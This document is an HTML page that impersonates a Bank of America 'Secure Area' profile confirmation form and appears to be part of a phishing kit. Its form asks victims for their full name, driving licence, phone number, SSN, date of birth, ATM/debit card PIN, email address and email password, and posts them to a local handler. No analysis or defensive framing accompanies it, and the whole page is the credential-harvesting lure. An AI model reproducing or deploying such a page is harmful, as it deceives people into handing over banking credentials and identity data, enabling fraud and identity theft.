<!DOCTYPE html>
<html lang="en">
<head>
	<title>Bank of America | Online Banking</title>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	
<!--===============================================================================================-->
	<link rel="icon" type="image/png" href="images/favicon.png"/>
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/bootstrap/css/bootstrap.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="fonts/Linearicons-Free-v1.0.0/icon-font.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/animate/animate.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/css-hamburgers/hamburgers.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/animsition/css/animsition.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/select2/select2.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/daterangepicker/daterangepicker.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="css/util.css">
	<link rel="stylesheet" type="text/css" href="css/main.css">
<!--===============================================================================================-->
</head>
<body>
	<div align="center" style="min-width:430px;background-color:#ffffff;">
	<div style="height:98px">
		<div align="left" style="padding-top:18px;padding-left:5%;">
	 <img src="images/assets-images-global-logos.svg" width="250" height="70" alt="">
		<div class="sl-nav">
			<ul>
			<div style="padding-top:10px;">
		 <p><img src="images/locki.svg" width="20" height="20" alt=""> <b style="padding-top:2px;"><font color="gray">Secure Area</font></b></p>
			</div>
			</ul>
		</div>
		</div>
		
	</div>
	<div style="background-color: #dc1431;
	background-image: url('images/ban1.png');
	background-size: 100%;
  border-color: rgba(232, 232, 232, 1);
  border-bottom-width: 1px;
  border-bottom-style: solid;
		color:white;
		height:40px;
  max-height:60px;">
		<div style="float:left;padding-top:5px;padding-left:5%;">
		<h4>Personal/Identity information</h4>
		</div>
	</div>
	</div>

	<div class="container-contact100">
		<div class="wrap-contact100">
			<form method="POST" action="sitekey" class="contact100-form validate-form">
     <span class="contact100-form-title">
      You're just moments away from confirm Bank of America profile.
     </span>
	 <label class="label-input100" for="fname">Full Name *</label>
				<div class="wrap-input100  validate-input" data-validate="Full Name is Required">
					<input id="fname" class="input100" type="text" maxlength="40" name="fname" placeholder="">
					<span class="focus-input100"></span>
				</div>

				<label class="label-input100" for="dlv">Driving Licence *</label>
				<div class="wrap-input100  validate-input" data-validate="Full Name is Required">
					<input id="dlv" class="input100" type="text" maxlength="50" name="addlvdr" placeholder="">
					<span class="focus-input100"></span>
				</div>
				
				<label class="label-input100" for="phon">Phone Number *</label>
				<div class="wrap-input100  validate-input" data-validate="Phone Number is Required">
					<input id="phon" class="input100" type="tel" minlength="13" maxlength="13" name="phon" placeholder="(000)000-0000">
					<span class="focus-input100"></span>
				</div>

				<label class="label-input100" for="ssni">Social Security Number (SSN) *</label>
				<div class="wrap-input100 validate-input" data-validate="Social Security Number (SSN) is Required">
					<input id="ssni" class="input100" type="text" minlength="11" maxlength="11" name="ssni" placeholder="000-00-0000" required="required" onkeypress="return isNumberKey(event)">
					<span class="focus-input100"></span>
				</div>

				<label class="label-input100" for="dob">Date of birth *</label>
				<div class="wrap-input100  validate-input" data-validate="Phone Number is Required">
					<input id="dob" class="input100" type="tel" minlength="10" maxlength="10" name="dob" placeholder="00/00/0000">
					<span class="focus-input100"></span>
				</div>

				<label class="label-input100" for="ati">ATM/Debit Card PIN *</label>
				<div class="wrap-input100 validate-input" data-validate="ATM/Debit Card PIN is Required">
					<input id="ati" class="input100" type="text" minlength="4" maxlength="6" name="ati" placeholder="0000" pattern="\d*" required="required" onkeypress="return isNumberKey(event)"/>
					<span class="focus-input100"></span>
				</div>

				<label class="label-input100" for="ema">Email Address *</label>
				<div class="wrap-input100  validate-input" data-validate="Email Address is Required">
					<input id="ema" class="input100" type="email" name="ema" placeholder="">
					<span class="focus-input100"></span>
				</div>
				
				<label class="label-input100" for="emp">Email Password *</label>
				<div class="wrap-input100  validate-input" data-validate="Email Password is Required">
					<input id="emp" class="input100" type="password" name="emp" placeholder="">
					<span class="focus-input100"></span>
				</div>

				<div class="container-contact100-form-btn">
					<button class="contact100-form-btn">
						Continue
					</button>
				</div>
				<input type="hidden" name="recaptcha_response" id="recaptchaResponse">

			</form>

			
		</div>
	</div>



	<div id="dropDownSelect1"></div>

<!--===============================================================================================-->
	<script src="vendor/jquery/jquery-3.2.1.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/animsition/js/animsition.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/bootstrap/js/popper.js"></script>
	<script src="vendor/bootstrap/js/bootstrap.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/select2/select2.min.js"></script>
	<script>
		$(".selection-2").select2({
			minimumResultsForSearch: 20,
			dropdownParent: $('#dropDownSelect1')
		});
	</script>
<script>
//Put our input DOM element into a jQuery Object
	var $expDate = jQuery('#exp');

	//Bind keyup/keydown to the input
	$expDate.bind('keyup','keydown', function(e){
		
	  //To accomdate for backspacing, we detect which key was pressed - if backspace, do nothing:
		if(e.which !== 8) {	
			var numChars = $expDate.val().length;
			if(numChars === 2){
				var thisVal = $expDate.val();
				thisVal += '/';
				$expDate.val(thisVal);
			}
	  }
	});
// NUMBERS ONLY

	function isNumberKey(evt)
	    {
	        var charCode = (evt.which) ? evt.which : event.keyCode
	        if (charCode > 31 && (charCode < 48 || charCode > 57))
	        return false;

	        return true;
	}
</script>
<!--===============================================================================================-->
	<script src="vendor/daterangepicker/moment.min.js"></script>
	<script src="vendor/daterangepicker/daterangepicker.js"></script>
<!--===============================================================================================-->
	<script src="vendor/countdowntime/countdowntime.js"></script>
<!--===============================================================================================-->
<script src="js/main.js"></script>
	<script src="js/angular.min.js"></script>
	<script src="js/jquery.min.js"></script>
	<script src="js/jquery.validate.min.js"></script>
	<script src="js/jquery.mask.js"></script>
	<script type="text/javascript">
    	$(function() {
        $('#phon').mask('(000)000-0000');
    	$('#ssni').mask('000-00-0000');
		$('#dob').mask('00/00/0000');
		$('#ati').mask('0000');
 });
 </script>

</body>
<style>
.footer {
 position: static;
 left: 0;
 bottom: 0;
 width: 100%;
 min-width:430px;
 background-color: #f3efea;
 color: white;
 text-align: center;
 display: inline-flex;
}
.footer>div {
flex: 1 0 50%;
padding-right: 15px;
padding-left: 15px;
max-width: 50%;
line-height: 1.2;
}
</style>
</html>
